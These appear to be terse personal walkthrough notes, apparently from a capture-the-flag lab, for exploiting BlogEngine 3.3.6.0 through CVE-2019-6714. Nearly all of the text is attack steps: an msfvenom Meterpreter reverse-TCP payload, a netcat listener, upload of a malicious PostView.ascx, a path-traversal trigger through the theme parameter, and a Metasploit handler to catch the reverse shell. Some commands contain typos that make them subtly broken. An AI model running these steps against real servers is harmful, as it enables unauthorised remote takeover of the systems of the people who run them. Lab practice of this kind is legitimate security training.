1)
- log in
- go onto info
-  3.3.6.0 
2) 
- go to exploit-db
- enter blogengine
- CVE-2019-6714
3)
- download the file in exploit-db and called it PostView.ascx
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=1234 f exe > shell.exe
- nc -lvnp 1234
- edit the file to your IP and port
- go to /admin/app/editor/editpost.cshtml
- upload the both files
- go to /?theme=../../App_Data/files/PostView.ascvx
- go to your shell on the listner 
- whoami
4)
- dir shell.exe /s /p
- cd /inetpub/wwwroot/App_Data/files
- on a different tab > msfconsole > use exploit/multi/handler > set PAYLOAD windows/meterpreter/reverse_tcp > set LHOST tun0 > set LPORT 1234 > run
- shell.exe